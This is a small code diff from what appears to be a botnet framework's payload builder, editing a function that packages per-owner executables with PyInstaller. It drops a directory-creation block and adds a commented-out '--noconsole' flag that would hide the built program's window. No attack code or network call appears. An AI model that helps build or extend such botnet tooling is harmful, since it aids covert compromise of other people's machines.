@@ -48,12 +48,6 @@ def _executable(owner, var=None):
     build_dir = os.path.join('botnet/executables', owner, 'build')
     spec_dir = os.path.join('botnet/executables', owner, 'spec')
     output_dir = os.path.join('botnet/executables', owner, 'exe')
-
-    if not os.path.isdir(output_dir):
-        try:
-            os.makedirs(output_dir)
-        except OSError:
-            utils.log("Permission denied: unable to make directory 'botnet/executables'")
     
     pyinstaller_command = [
         'pyinstaller',
@@ -64,6 +58,7 @@ def _executable(owner, var=None):
         '--workpath',
         build_dir,
         '--onefile',
+        # '--noconsole',
     ]
 
     try:
